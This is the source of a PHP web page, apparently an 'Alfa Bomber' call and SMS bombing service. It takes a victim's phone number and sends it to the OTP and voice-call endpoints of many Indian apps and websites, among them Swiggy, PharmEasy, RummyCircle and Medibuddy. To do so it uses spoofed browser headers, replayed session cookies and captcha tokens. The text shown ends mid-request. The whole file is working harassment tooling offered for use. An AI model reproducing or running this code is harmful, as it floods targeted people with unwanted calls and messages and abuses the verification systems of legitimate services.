<?php
session_start();
error_reporting(0);
?>
<!DOCTYPE html>
<html lang="en">
  <head>
  <meta name="title"
    content="We Provide Best Unlimited free Call+sms Bomber And Other Web-Tools In 2023">
  <meta name="description"
    content="It Is The Best Free Call Bomber Service The World. We provide best free unlimited call bomber in 2023. You can send huge monunt of call  by using our online call bomber.">
  <meta name="keywords"
    content="call bomber, call bomber.in, Call Bomber 2023,  call sms bomber, Unlimited call bomber, call bomber website, sms bomber, call bomber app, free callbomber, call bomber fast, unlimited sms bomber, unprotact number from callbomber, call bombing,sms bomber tools, how to stop call bomber, callbomer new key, whatsapp bomber sms, whatsapp bombing, sms bomber stop, bomb it calls, whatsapp call bomber, super fast call bomber, call bomber 1000 msg send, how to unprotect number from call bomber, call bomber fastest, bombing tools, call bomber fastest, how to call bomb someone,  callbomber , Best Call Bomber, International Call Bomber, Sms Bomber, Custom Sms Bomber, Next Bomb, Whatsapp Bomber, call bomber whatsapp, whatsapp sms bomber, super fast bomber">
  <meta name="author" content="Alfa-Bomb">
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Alfa Paid Server</title>
    <link rel="stylesheet" href="#" />
    <style>
     *{
        margin: 0px;
        padding: 0px;
        overflow: hidden;
        text-align: center;
    }
    body{
      background:#333;
    }

    .heading{
        display: flex;
        margin-top:50px;
        margin-bottom:50px;
        height: 100px;
        justify-content: center;
        align-items: center;
    }

    .heading img{
        width: 80px;
        border-radius:50%;
        margin:10px;
    }

    input::-webkit-outer-spin-button,
    input::-webkit-inner-spin-button {
        -webkit-appearance: none;
        margin: 0;
    }

    input[type=number] {
        -moz-appearance: textfield;
    }

    .heading h2{
      color: color:#333;;
      font-family: "Courier", monospace;
    }
    
    .form{
        display:flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;

    }
    .forminput{
        font-size: 20px;
        text-align: center;
        border-radius: 23px;
        display: block;
        margin: 13px;
    } 
    .btns{
        display: block;
        background: #0D6EFD;
        border: 0;
        border-radius:23px;
        color: white;
        font-family: Space Grotesk;
        text-transform: uppercase;
        cursor: pointer;
        margin: auto;
        padding: 10px;
        font-size: 25px;
    }
    .btns:hover{
            background: #000;
        }

    .footerbar{
        color: #333;
        font-family: Space Grotesk;
        font-weight: bold;
        padding-top: 10px;
    }

        .bomb-start{
            color: #000;
            display: flex;
            padding-top: 10px;
            font-family: Space Grotesk;
            justify-content: center;
            align-items: center;
        }
        .bomb-count{
            display: flex;
            justify-content: center;
            align-items: center;
            color: red;
            padding-top: 10px;
        }
        #stop-btn{
            position: relative;
            display: inline-block;
            background:#0D6EFD;
            border-radius:23px;
            font-size: 18px;
            text-transform: uppercase;
            color: #fff;
            text-decoration: none;
            padding: 20px 30px;
            font-weight: 500;
            margin-top: 15px;
        }
        
    </style>
  </head>
  <body>
      <div class="bg-img">
    <div class="heading">
      <a href="index.html"><img src="assets/images/logo.jpg"></a>
      <h2>ALFA BOMBER PRIME</h2>
    </div>
    <?php
    
    if(isset($_GET['submit'])){
    $number = $_GET['number'];
    $getlimit = $_GET['countnumber'];
	$currentlimit=$_SESSION['limitset'];
		
    function RandomNumber($length)
{
$str="";
for($i=0;$i<$length;$i++){
$str.=mt_rand(0,9);
}
return $str;
}
$n = array('charan','raaghu','sumit','chandru','rishab','tanmay','ravi','riya','deepak','shashi','revanth','smitha','gowri','arun','arpitha','anusha','chinmay','thilak','manu','mithun','rahul','abhishek','kavya','kavitha','savitha','sachin','manohar','ajay','anurag','madhu','kushal','anil','askash','yogesh','vidya','rajesh','sagar','madhan','vishal','ramya','riyanth','ravishankar','radha','raju','sudha','avinash','fidju','arihanth','babu','priya','preethi','priyanka','preetham','suman','sunitha','tanu','manu','mahesh','mahendra','manoj','vikas','abhinav','arya','raaghu','sumit','chandru','rishab','tanmay','ravi','riya','deepak','shashi','revanth','smitha','gowri','arun','arpitha','anusha','chinmay','thilak','manu','mithun','rahul','abhishek','kavya','kavitha','savitha','sachin','manohar','ajay','anurag','madhu','kushal','anil','askash','yogesh','vidya','rajesh','sagar','madhan','vishal','ramya','riyanth','ravishankar','radha','raju','sudha','avinash','fidju','arihanth','babu','priya','preethi','priyanka','ananth','sumana','saritha','yogesh','razz');
$fname = $n[mt_rand(0,count($n))];	

$imei=RandomNumber(15);
$user=RandomNumber(21);

if("$currentlimit" == "$getlimit"){
echo"<span class='bomb-start'>successfully Bombed ".$getlimit."</span>"; exit;}
		
/*  URL , HEADERS &  DATA     */

$user = '@IsleXCat';
$text = urlencode($number);

$url21 = "https://api.callmebot.com/text.php?user=$user&text=$text";

$response = file_get_contents($url21);


$user1 = '@apibotlebro';
$text1 = urlencode($number);

$url200 = "https://api.callmebot.com/text.php?user=$user1&text=$text1";

$response = file_get_contents($url200);

//Api 22//

$url89 = 'https://api.khelbro.com/api/v2/auth/login';

// Data to be sent in the POST request
$jsonData89 = '{"mobile":"'.$number.'","otp":null,"username":null,"refer_code":null}';

// Initialize cURL session
$ch = curl_init($url89);

// Set cURL options
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData89);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: api.khelbro.com',
    'Content-Length: ' . strlen($jsonData89),
    'Content-Type: application/json',
    'Accept-Encoding: gzip', // Enable gzip compression
    'User-Agent: Mozilla/5.0 (Linux; Android 11; Realme 5 Series Build/RD2A.211001.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.193 Mobile Safari/537.36',
    'Origin: https://khelbro.com',
    'Sec-Fetch-Site: same-site',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Dest: empty',
    'Referer: https://khelbro.com/',
    'Accept-Language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
));

echo $response = curl_exec($ch);

if (curl_errno($ch)) {
    echo 'Curl error: ' . curl_error($ch);
}

curl_close($ch);
//Api 23//
// URL to send the POST request
$url90 = 'https://api.khelbro.com/api/v2/auth/resendOtp';

// Data to be sent in the POST request
$jsonData90 = '{"mobile":"'.$number.'","retryType":"voice"}';

// Initialize cURL session
$ch = curl_init($url90);

// Set cURL options
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData90);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: api.khelbro.com',
    'Content-Length: ' . strlen($jsonData90),
    'Content-Type: application/json',
    'Accept-Encoding: gzip', // Enable gzip compression
    'User-Agent: Mozilla/5.0 (Linux; Android 11; Realme 5 Series Build/RD2A.211001.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.193 Mobile Safari/537.36',
    'Origin: https://khelbro.com',
    'Sec-Fetch-Site: same-site',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Dest: empty',
    'Referer: https://khelbro.com/',
    'Accept-Language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
));

echo $response = curl_exec($ch);

if (curl_errno($ch)) {
    echo 'Curl error: ' . curl_error($ch);
}

curl_close($ch);

// Api 1 //
$url45 = 'https://m.rummycircle.com/api/fl/account/v1/sendOtp';
$data45 = array(
    "mobile" => "$number",
    "otpOnCall" => true,
    "otpType" => 8,
    "transactionId" => time() * 1000 // Using UNIX timestamp in milliseconds as transactionId
);
$jsonData = json_encode($data45);

$expiresDate1 = gmdate("D, d M Y H:i:s \G\M\T", strtotime("+30 days")); // Cookie 1 expiry date (30 days from now)
$expiresDate2 = gmdate("D, d M Y H:i:s \G\M\T", strtotime("+20 years")); // Cookie 2 expiry date (20 years from now)

$headers45 = array(
    'Host: m.rummycircle.com',
    'Cookie: NA_IDVISIT=3240889a-0d8d-40c3-a53e-a60c7c46c598; Path=/; Domain=rummycircle.com; Expires=' . $expiresDate1 . '; Max-Age=1800000000000;;NA_VISITOR=3240889a-0d8d-40c3-a53e-a60c7c46c598; Path=/; Domain=rummycircle.com; Expires=' . $expiresDate2 . '; Max-Age=630720000000000000;;SSID=SSIDc476015d-e80c-4326-8b95-97a89e36e03b; Max-Age=1800; Domain=.rummycircle.com; Path=/; Expires=Fri, 28 Jul 2023 16:29:50 GMT; Secure; SameSite=None;',
    'User-Agent: Mozilla/5.0 (Linux; Android 10; RMX1911 Build/QKQ1.200209.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.99 Mobile Safari/537.36 (/rcchannelid:7.50/) (/rcprimary:362/) [RCAndroid/7.50]',
    'Origin: https://m.rummycircle.com/',
    'Content-Type: application/json; charset=UTF-8',
    'Content-Length: ' . strlen($jsonData),
    'Accept-Encoding: gzip'
);

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, $url45);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers45);
$response = curl_exec($ch);

curl_close($ch);
$responseData = json_decode($response, true);
 //Api 2 //
$url = "https://profile.swiggy.com/api/v3/app/request_call_verification";
//$url = "https://profile.swiggy.com/api/v3/app/request_call_verification";

// Request data
$data = [
    "mobile" => "$number"
];

// Headers
$headers = [
    "Host: profile.swiggy.com",
    "tracestate: @nr=0-2-737486-14933469-25139d3d045e42ba----1692101455751",
    "traceparent: 00-9d2eef48a5b94caea992b7a54c3449d6-25139d3d045e42ba-00",
    "newrelic: eyJ2IjpbMCwyXSwiZCI6eyJ0eSI6Ik1vYmlsZSIsImFjIjoiNzM3NDg2IiwiYXAiOiIxNDkzMzQ2OSIsInRyIjoiOWQyZWVmNDhhNWI9ZDYiLCJpZCI6IjI1MTM9ZDNkMDQ1ZTQyYmEiLCJ0aSI6MTY5MjEwMTQ1NTc1MX19",
    "pl-version: 55",
    "user-agent: Swiggy-Android",
    "tid: e5fe04cb-a273-47f8-9d18-9abd33c7f7f6",
    "sid: 8rt48da5-f9d8-4cb8-9e01-8a3b18e01f1c",
    "version-code: 1161",
    "app-version: 4.38.1",
    "latitude: 0.0",
    "longitude: 0.0",
    "os-version: 13",
    "accessibility_enabled: false",
    "swuid: 4c27ae3a76b146f3",
    "deviceid: 4c27ae3a76b146f3",
    "x-network-quality: GOOD",
    "accept-encoding: gzip",
    "accept: application/json; charset=utf-8",
    "content-type: application/json; charset=utf-8",
    "content-length: " . strlen(json_encode($data)),
    "x-newrelic-id: UwUAVV5VGwIEXVJRAwcO"
];

// Initialize cURL session
$ch = curl_init();

// Set cURL options
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Execute cURL session and get the response
$response = curl_exec($ch);

// Check for cURL errors
if (curl_errno($ch)) {
    echo 'Curl error: ' . curl_error($ch);
}

// Close cURL session
curl_close($ch);
 //Api 3 //
$url3 = "https://api.cureskin.com/api/parse/functions/requestOTP";

$headers3 = array(
    "Host: api.cureskin.com",
    "Content-Length: 299",
    "Baggage: sentry-environment=production,sentry-release=app%402.0.428-0,sentry-public_key=fb75233753ac48cc93a56596bcdc8525,sentry-trace_id=1f108bfb18da4ae99681d51a0c08419c",
    "User-Agent: Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36",
    "Sentry-Trace: 1f108bfb18da4ae99681d51a0c08419c-a22bb520894a1948-0",
    "Content-Type: text/plain",
    "Accept: */*",
    "Origin: https://app.cureskin.com",
    "X-Requested-With: pure.lite.browser",
    "Sec-Fetch-Site: same-site",
    "Sec-Fetch-Mode: cors",
    "Sec-Fetch-Dest: empty",
    "Referer: https://app.cureskin.com/",
    "Accept-Encoding: gzip, deflate",
    "Accept-Language: en-IN,en-US;q=0.9,en;q=0.8"
);

$data3 = json_encode(array(
    "mobileNumber" => "$number",
    "deviceId" => "f338792bf49fb2e48229",
    "source" => "web",
    "time" => "2023-09-24T08:22:25.811Z",
    "digest" => "d7ec0ba46dc9eff36f048bb46592294c858070ad31fa770f4e1e1dea82cf6a93",
    "_ApplicationId" => "myAppId",
    "_ClientVersion" => "js3.4.4",
    "_InstallationId" => "4d53e2d5-2108-42ed-92da-ac252e7f87ce"
));

$ch = curl_init($url3);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_POSTFIELDS, $data3);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers3);

$response = curl_exec($ch);

curl_close($ch);

//Api 4//
$url1 = "https://api.cureskin.com/api/parse/functions/retryOTP";

$headers1 = array(
    "Host: api.cureskin.com",
    "Content-Length: 284",
    "Baggage: sentry-environment=production,sentry-release=app%402.0.428-0,sentry-public_key=fb75233753ac48cc93a56596bcdc8525,sentry-trace_id=46eaa3e5f35a480abd0a25517080c82f",
    "User-Agent: Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36",
    "Sentry-Trace: 46eaa3e5f35a480abd0a25517080c82f-aeaeed3f7740c180-0",
    "Content-Type: text/plain",
    "Accept: */*",
    "Origin: https://app.cureskin.com",
    "X-Requested-With: pure.lite.browser",
    "Sec-Fetch-Site: same-site",
    "Sec-Fetch-Mode: cors",
    "Sec-Fetch-Dest: empty",
    "Referer: https://app.cureskin.com/",
    "Accept-Encoding: gzip, deflate",
    "Accept-Language: en-IN,en-US;q=0.9,en;q=0.8"
);

$data1 = json_encode(array(
    "mobileNumber" => "$number",
    "deviceId" => "f338792bf49fb2e48229",
    "time" => "2023-09-24T08:22:57.160Z",
    "digest" => "ab994830a6bca8ad49be89e14592d06deee04c42d63d6f4a6263b1b244e2d2f7",
    "_ApplicationId" => "myAppId",
    "_ClientVersion" => "js3.4.4",
    "_InstallationId" => "4d53e2d5-2108-42ed-92da-ac252e7f87ce"
));

$ch = curl_init($url1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_POSTFIELDS, $data1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers1);

$response = curl_exec($ch);

//Api 5 //
$url7 = "https://prod.milkbasket.com/milkbasket_prod_current/consumer/user/register_mobile";

$headers7 = array(
    "Accept-Charset: UTF-8",
    "Content-Type: application/json; charset=UTF-8",
    "Accept-Encoding: gzip",
    "User-Agent: Dalvik/2.1.0 (Linux; U; Android 11; SM-A105F Build/RP1A.200720.012)",
    "Host: prod.milkbasket.com",
    "Connection: Keep-Alive",
    "Content-Length: 94"
);

$data7 = array(
    "retry" => true,
    "mobile" => "$number",
    "retryType" => "voice",
    "loaderMessage" => "Initializing call.."
);

$ch = curl_init($url7);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers7);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data7));

$response = curl_exec($ch);

// Api 6 //
$url9 = "https://prod.milkbasket.com/milkbasket_prod_current/consumer/user/register_mobile";

$headers9 = array(
    "Accept-Charset: UTF-8",
    "Content-Type: application/json; charset=UTF-8",
    "Accept-Encoding: gzip",
    "User-Agent: Dalvik/2.1.0 (Linux; U; Android 11; SM-A105F Build/RP1A.200720.012)",
    "Host: prod.milkbasket.com",
    "Connection: Keep-Alive",
    "Content-Length: 48"
);

$data9 = array(
    "mobile" => "$number",
    "appHash" => "tG3K6W/hoYi"
);

$ch = curl_init($url9);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers9);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data9));

$response = curl_exec($ch);
curl_close($ch);

// Api 7 //
$url17='https://www.medibuddy.in/unified-login/user/register';

$data17= '{"phonenumber":"'.$number.'"}';

$headers17 = ['www.medibuddy.in','User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36','Content-Type: application/json','Accept: application/json, text/plain, */*','Origin: https://www.medibuddy.in','Referer: https://www.medibuddy.in/','Accept-Encoding: gzip, deflate','Accept-Language: en-US,en;q=0.9'];

 $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL,$url17);
  curl_setopt($ch, CURLOPT_POSTFIELDS,$data17);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_HTTPHEADER,$headers17);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $output= curl_exec ($ch);
  $json=json_decode($output,true);
  $msg = $json['message'];
  curl_close ($ch);
  
  
  //Api 8 //
  $url24 = "https://api-fms.blackbuck.com/gateway/api/v1/sessions/login";

// JSON data to send in the request body
$data24 = array(
    "channel" => "otp",
    "phone_no" => "$number",
    "tenant_name" => "SUPPLY"
);

// Convert the data to JSON format
$jsonData = json_encode($data24);

// Initialize cURL session
$ch = curl_init($url24);

// Set custom headers
$headers24 = array(
    "Host: api-fms.blackbuck.com",
    "content-length: " . strlen($jsonData),
    "x-aaa-enabled: true",
    "x-partner-id: vl2e2iJ9YnPauqie6t5keyCakKAufsxe",
    "user-agent: Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36",
    "content-type: application/json",
    "accept: */*",
    "origin: https://blackbuck.com",
    "x-requested-with: pure.lite.browser",
    "sec-fetch-site: same-site",
    "sec-fetch-mode: cors",
    "sec-fetch-dest: empty",
    "referer: https://blackbuck.com/",
    "accept-encoding: gzip, deflate",
    "accept-language: en-IN,en-US;q=0.9,en;q=0.8"
);

// Set cURL options for a POST request with headers and JSON data
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers24);
curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Execute the cURL session and store the result in $response
$response = curl_exec($ch);

//Api 9 //

$apiUrl23 = "https://pharmeasy.in/apt-api/login/send-otp";

// Headers
$headers23 = array(
    'Host: pharmeasy.in',
    'Content-Length: 22',
    'X-Instana-T: 18322b1da9a3697c',
    'Sec-Ch-UA: "Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
    'Sec-Ch-UA-Mobile: ?1',
    'X-Instana-L: 1,correlationType=web;correlationId=18322b1da9a3697c',
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'Content-Type: application/json',
    'Accept: application/json, text/plain, */*',
    'X-Instana-S: 18322b1da9a3697c',
    'Sec-Ch-UA-Platform: "Android"',
    'Origin: https://pharmeasy.in',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Dest: empty',
    'Referer: https://pharmeasy.in/',
    'Accept-Encoding: gzip, deflate, br',
    'Accept-Language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6,ny;q=0.5',
    'Cookie: XdI=8x58604CLYgtgFXRi44Tb',
    'Cookie: XPESD=%7B%22session_id%22%3A%22s_w_8x58604CLYgtgFXRi44Tb_1693248728000%22%2C%22session_id_flag%22%3A%22ct_id%22%2C%22referrer%22%3A%22%22%2C%22session_start_time%22%3A%222023-08-28T18%3A52%3A08.687Z%22%7D',
    'Cookie: XPESS_v2=s_w_8x58604CLYgtgFXRi44Tb_1693248728000',
    'Cookie: _gcl_au=1.1.1044233750.1693248744',
    'Cookie: dtm_token_sc=AQEKiVWle5I_5wEsrWrBAQEBAQA',
    'Cookie: dtm_token=AQEKiVWle5I_5wEsrWrBAQBBbQE',
    'Cookie: _ga_J4XE9SW84F=GS1.1.1693248746.1.0.1693248746.60.0.0',
    'Cookie: _ga=GA1.2.2140808490.1693248746',
    'Cookie: _gid=GA1.2.623724605.1693248747',
    'Cookie: _gat_UA-60621013-1=1',
    'Cookie: WZRK_G=193f944a6c8343099621b45d6db71145',
    'Cookie: WZRK_S_R9Z-WWR-854Z=%7B%22p%22%3A1%2C%22s%22%3A1693248752%2C%22t%22%3A1693248751%7D',
    'Cookie: _fbp=fb.1.1693248753151.1695634824'
);

// Data to send in the POST request
$data23 = array(
    'param' => ''.$number.''
);

// Convert data to JSON
$jsonData = json_encode($data23);

// Initialize cURL session
$ch = curl_init();

// Set cURL options
curl_setopt($ch, CURLOPT_URL, $apiUrl23);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers23);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);

// Execute cURL session and store the response
$response = curl_exec($ch);

$url79 = 'https://www.augmont.com/api/customer/customer-sign-up';

$headers79 = array(
    'Content-Type: application/json',
    'accept: application/json, text/plain, */*',
    'user-agent: Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36',
    'content-type: application/json',
    'origin: https://www.augmont.com',
    'x-requested-with: pure.lite.browser',
    'sec-fetch-site: same-origin',
    'sec-fetch-mode: cors',
    'sec-fetch-dest: empty',
    'referer: https://www.augmont.com/',
    'accept-encoding: gzip, deflate, br',
    'accept-language: en-IN,en-US;q=0.9,en;q=0.8',
    'cookie: _fbp=fb.1.1702937484914.1495257313',
    'cookie: _gcl_au=1.1.818480751.1702937487',
    'cookie: _gid=GA1.2.635828768.1702937488',
    'cookie: _clck=djsqed%7C2%7Cfhn%7C0%7C1447',
    'cookie: _ga=GA1.1.1969712223.1702937488',
    'cookie: _clsk=uxtabs%7C1702937490575%7C1%7C1%7Cq.clarity.ms%2Fcollect',
    'cookie: _ga_Q81YZWSTSD=GS1.1.1702937487.1.1.1702937524.23.0.0',
    'cookie: _ga_DPGBLKH6P7=GS1.1.1702937489.1.1.1702937525.24.0.0',
    'cookie: _ga_J16K3G8J77=GS1.1.1702937489.1.1.1702937525.0.0.0'
);

$data79 = array(
    'mobileNumber' => $number,
    'value' => 'FPKh',
    'captcha' => '25943b63fa8e51857625996a76cc95e7cf913fb93e33c50ae59f3f64014c8ae8491cc9a3465fd6748c2e64fa08063b181273367a8ee6d9870c4ac553ec705eec8ef753d46f2329db284c469803a1bb4301e3370baa60d64a4cd09f55235b94df614abde6910255c568acc10e640a41fba8c4a06144f79d90831057a58e657bd2e82cc92deef70c197369019a3afd15916ecf7c688c0805eda674244bf78c65eeaf9c7f044b9897584d9e3cde6afd45b1',
    'isResendOtpByVoice' => true
);

$ch = curl_init($url79);

curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data79));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers79);

$response = curl_exec($ch);

if (curl_errno($ch)) {
    echo 'Error: ' . curl_error($ch);
}

curl_close($ch);

//Api 10//
// API endpoint URL
$url25 = "https://www.mylescars.com/Login/requestotp_V2";

// Request data
$data25 = [
    "contactNo" => "$number"
];

// Convert data to URL-encoded format
$data_string = http_build_query($data25);

// Headers
$headers25 = [
    "Host: www.mylescars.com",
    "content-length: " . strlen($data_string),
    "sec-ch-ua: \"Chromium\";v=\"112\", \"Google Chrome\";v=\"112\", \"Not:A-Brand\";v=\"99\"",
    "accept: */*",
    "content-type: application/x-www-form-urlencoded; charset=UTF-8",
    "x-requested-with: XMLHttpRequest",
    "sec-ch-ua-mobile: ?1",
    "user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "sec-ch-ua-platform: \"Android\"",
    "origin: https://www.mylescars.com",
    "sec-fetch-site: same-origin",
    "sec-fetch-mode: cors",
    "sec-fetch-dest: empty",
    "referer: https://www.mylescars.com/",
    "accept-encoding: gzip, deflate, br",
    "accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6,ny;q=0.5",
    // Add all the necessary cookies here
];

// Initialize cURL session
$ch = curl_init();

// Set cURL options
curl_setopt($ch, CURLOPT_URL, $url25);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers25);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Execute cURL session and get the response
$response = curl_exec($ch);
// Api 11//
$url16 = "https://www.tallentex.com/tex2024/userpanel/register";

// Request data
$data16 = [
    "Mobile" => "$number",
    "selectedDeclarations" => ["1", "2"],
    "lpsource" => "www.tallentex.com",
    "lprequest" => "",
    "Studyccode" => "",
    "utmsource" => "",
    "utmmedium" => "",
    "utmcampaign" => "",
    "utmcontent" => "",
    "GCLID" => "",
    "utmterm" => ""
];

// Convert data to URL-encoded format
$data_string = http_build_query($data16);

// Headers
$headers16 = [
    "Host: www.tallentex.com",
    "content-length: " . strlen($data_string),
    "cache-control: max-age=0",
    "sec-ch-ua: \"Chromium\";v=\"112\", \"Google Chrome\";v=\"112\", \"Not:A-Brand\";v=\"99\"",
    "sec-ch-ua-mobile: ?1",
    "sec-ch-ua-platform: \"Android\"",
    "upgrade-insecure-requests: 1",
    "origin: https://www.tallentex.com",
    "content-type: application/x-www-form-urlencoded",
    "user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "sec-fetch-site: same-origin",
    "sec-fetch-mode: navigate",
    "sec-fetch-user: ?1",
    "sec-fetch-dest: document",
    "referer: https://www.tallentex.com/tex2024/userpanel/register",
    "accept-encoding: gzip, deflate, br",
    "accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6,ny;q=0.5",
    // Add all the necessary cookies here
];

// Initialize cURL session
$ch = curl_init();

// Set cURL options
curl_setopt($ch, CURLOPT_URL, $url16);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers16);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Execute cURL session and get the response
$response = curl_exec($ch);


// Api 12 //

$url14 = "https://citymall.live/api/cl-user/auth/get-otp";

// Request data
$data14 = [
    "phone_number" => "$number"
];

// Convert data to JSON format
$data_json = json_encode($data14);

// Headers
$headers14 = [
    "Host: citymall.live",
    "Connection: keep-alive",
    "Content-Length: " . strlen($data_json),
    "Accept: application/json, text/plain, */*",
    "use-applinks: true",
    "language: en",
    "x-requested-with: WEB",
    "x-app-name: WEB",
    "User-Agent: Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36",
    "Content-Type: application/json",
    "Origin: https://citymall.live",
    "Sec-Fetch-Site: same-origin",
    "Sec-Fetch-Mode: cors",
    "Sec-Fetch-Dest: empty",
    "Referer: https://citymall.live/",
    "Accept-Encoding: gzip, deflate",
    "Accept-Language: en-IN,en-US;q=0.9,en;q=0.8",
    "Cookie: bp=sm; _ga=GA1.1.386194380.1695486807; WZRK_G=ab8afd4b7b494ac39dfaf4f66098a17c; _fbp=fb.1.1695486807644.468518692; vxid=d4087f044245b1b245602471bec8f9d6; WZRK_S_4RW-KZK-995Z=%7B%22p%22%3A1%2C%22s%22%3A1695486807%2C%22t%22%3A1695486848%7D; _ga_45DD1K708L=GS1.1.1695486806.1.1.1695486887.0.0.0",
];

// Initialize cURL session
$ch = curl_init();

// Set cURL options
curl_setopt($ch, CURLOPT_URL, $url14);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data_json);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers14);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Execute cURL session and get the response
$response = curl_exec($ch);

 //Api 13 //

$url13 = "https://www.research360.in/ajax/loginApi.php";

// Request data
$data13 = [
    "email_or_mobile" => "$number",
    "send_otp" => "true"
];

// Convert data to URL-encoded format
$data_string = http_build_query($data13);

// Headers
$headers13 = [
    "Host: www.research360.in",
    "content-length: " . strlen($data_string),
    "sec-ch-ua: \"Chromium\";v=\"112\", \"Google Chrome\";v=\"112\", \"Not:A-Brand\";v=\"99\"",
    "accept: application/json, text/javascript, */*; q=0.01",
    "content-type: application/x-www-form-urlencoded; charset=UTF-8",
    "x-requested-with: XMLHttpRequest",
    "sec-ch-ua-mobile: ?1",
